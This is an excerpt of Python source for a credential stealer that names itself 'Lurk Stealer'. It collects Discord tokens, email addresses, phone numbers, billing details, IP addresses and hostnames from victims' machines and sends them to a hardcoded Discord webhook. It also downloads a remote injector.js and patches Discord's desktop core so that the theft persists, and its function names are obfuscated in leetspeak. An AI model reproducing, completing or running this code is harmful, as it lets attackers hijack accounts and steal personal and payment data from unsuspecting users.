...
WEBHOOK_URL = "https://discord.com/api/webhooks/1070007318256820255/eoqVsQJPSVSE_h5ClTYwxpxhpcb03hoO_Yww-RrOYS9q2AyYZw5ACYbEisUA3QS47prZ"
color = 0x2F3136
...
def globalInfo():
    ...
    globalinfo = f":flag_{contryCode}:"
    # print(globalinfo)
    return globalinfo

def L04durl1b(WEBHOOK_URL, data='', files='', headers=''):
    for i in range(8):
        try:
            if headers != '':
                r = urlopen(Request(WEBHOOK_URL, data=data, headers=headers))
                return r
            else:
                r = urlopen(Request(WEBHOOK_URL, data=data))
                return r
        except:
            pass
...
def G3tUHQFr13ndS(t0k3n):
    b4dg3List =  [
        {"Name": 'Active_Developer', 'Value': 131072, 'Emoji': "<:active:1066503169825312769> "},
...
def G3tT0k4n1nf9(t0k3n):
    ...
    if "premium_type" in us3rjs0n:
        ...
        if nitrot == 1:
            n1tr0 = "<:classic:896119171019067423> "
        elif nitrot == 2:
            n1tr0 = "<a:boost:824036778570416129> <:classic:896119171019067423> "
    if "phone" in us3rjs0n: phone = f'`{us3rjs0n["phone"]}`'

    return us3rn4m1, hashtag, em31l, idd, pfp, flags, n1tr0, phone
...
def upl05dT4k31(t0k3n, path):
    ...
    us3rn4m1, hashtag, em31l, idd, pfp, flags, n1tr0, phone = G3tT0k4n1nf9(t0k3n)
    ...
    data = {
        ...
        "embeds": [
            ...
            "fields": [
                ...
                {
                    "name": "",
                    "value": f"```Hostname: {vctm_pc}\nFound in:\n{path}```"
                },
                {        
                    "name": "<a:1053787529809244222:1063682947884003348> Token",
                    "value": f"```{t0k3n}``` **[Click to copy](https://superfurrycdn.nl/copy/{t0k3n})**",
                    "inline": False
                },
                {
                    "name": "<a:badge:1063679253683654656> Badges",
                    "value": f"{n1tr0}{b4dg3}",
                    "inline": True
                },
                {
                    "name": "<:happy:1063682920247738368> Billing",
                    "value": f"{b1ll1ng}",
                    "inline": True
                },
                {
                    "name": "<a:star:1066501991884394667> IP",
                    "value": f"```{g3t1p()}```",
                    "inline": True
                },
                {    
                    "name": "<:pret3:1062557280131878942> Email",
                    "value": f"```{em31l}```",
                    "inline": True
                },
                {
                    "name": "<a:black_morcegohyp:1060613457222836344> Phone",
                    "value": f"``{phone}``",
                    "inline": True
                },
                {
            ...
            "footer": {
                "text": "Lurk Stealer",
                "icon_url": "https://media.discordapp.net/attachments/1066036396525105232/1066496355259908206/lurk.png"
                },
            "thumbnail": {
                "url": f"{pfp}"
                }
        ...
        "avatar_url": "https://media.discordapp.net/attachments/1066036396525105232/1066496355259908206/lurk.png",
        "username": f"Lurk Stealer - {vctm_pc}",
        "attachments": []
        }
    # urlopen(Request(hook, data=dumps(data).encode(), headers=headers))
    L04durl1b(WEBHOOK_URL, data=dumps(data).encode(), headers=headers)
...
def upload(name, tk=''):
    ...
    if name == "kiwi":
        ...
        "embeds": [
            ...
            "fields": [
                {
                "name": f"PC {vctm_pc} - Files Stealer PC",
                "value": tk
                }
            ],
            "author": {
    ...
    L04dR3qu3sTs("POST", WEBHOOK_URL, files=files)
		...
		if 'discord' in _dir.lower():
			for __dir in os.listdir(os.path.abspath(appdata+os.sep+_dir)):
				if match(r'app-(\d*\.\d*)*', __dir):
					...
					f = requests.get("https://raw.githubusercontent.com/IvanDevGames/index.js/main/injector.js").text.replace("%WEBHOOK%", webhook_url)
	...
	if os.path.exists(appdata+'\\discord'):
		with open(abspath+f'\\modules\\{difflib.get_close_matches("discord_desktop_core", modules_dir, n=1, cutoff=0.6)[0]}\\discord_desktop_core\\index.js', 'r', encoding="utf-8") as indexFile:
			...
			if webhook_url in index:
				...
				embed = Embed(title="Lurk Stealer", color=0xff0000)

				embed.set_footer(text="Lurk Stealer")
				embed.set_thumbnail(url="https://media.discordapp.net/attachments/1066036396525105232/1066496355259908206/lurk.png")
				embed.add_field(name="Injection Discord", value=f"Successfully injected into Discord\n\n```User: {os.getenv('UserName')}\nIP: {requests.get('http://ipinfo.io/json').json()['ip']}```", inline=False)
	
				webhook.send(embed=embed, avatar_url="https://media.discordapp.net/attachments/1066036396525105232/1066496355259908206/lurk.png", username="Lurk Stealer")
